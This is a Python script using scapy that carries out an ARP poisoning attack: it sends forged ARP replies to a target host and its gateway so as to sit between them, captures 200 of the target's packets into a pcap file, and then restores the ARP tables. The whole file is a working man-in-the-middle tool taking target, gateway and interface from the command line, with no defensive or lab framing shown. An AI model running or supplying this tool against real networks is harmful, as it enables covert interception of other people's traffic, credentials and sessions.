"""ARP POISONING"""
from struct import pack
from scapy.all import srp, Ether, ARP, send, get_if_hwaddr, conf, sniff, wrpcap
from multiprocessing import Process
import sys
import time

"""Get mac address from IP"""
def get_mac(ip):
    packet = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="who-has", pdst=ip)
    ans, _ = srp(packet, timeout=2, retry=5, verbose=False)
    for _,r in ans:
        return r[Ether].src
    return None

"""main class"""
class Arper:
    def __init__(self, target_ip, gateway_ip, interface="en0"):
        self.target_ip = target_ip
        self.target_mac = get_mac(target_ip)
        self.gateway_ip = gateway_ip
        self.gateway_mac = get_mac(gateway_ip)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0        

    def run(self):
        self.posion_thread = Process(target=self.poison)
        self.posion_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        target = ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac)
        print(target.summary())
        print("*"*30)
        gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac)
        print(gateway.summary())
        print("*"*30)
        print("Beginning ARP Poison. [CTRL-C to stop]")
        while True:
            try:
                sys.stdout.write(".")
                sys.stdout.flush()
                send(target)
                send(gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        filter = f"ip host {self.target_ip}"
        packets = sniff(filter=filter, count=count, iface=self.interface)
        wrpcap("output.pcap", packets)
        print("Got packets")
        self.restore()
        self.posion_thread.terminate()
        print("finished")
    """normal arp sending"""
    def restore(self):
        send(ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwsrc=self.gateway_mac, hwdst="FF:FF:FF:FF:FF:FF"), count=5)
        send(ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwsrc=self.target_mac, hwdst="FF:FF:FF:FF:FF:FF"), count=5)

def main():
    (target_ip, gateway_ip, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arper = Arper(target_ip, gateway_ip, interface)
    arper.run()    

if __name__ == "__main__":
    main()
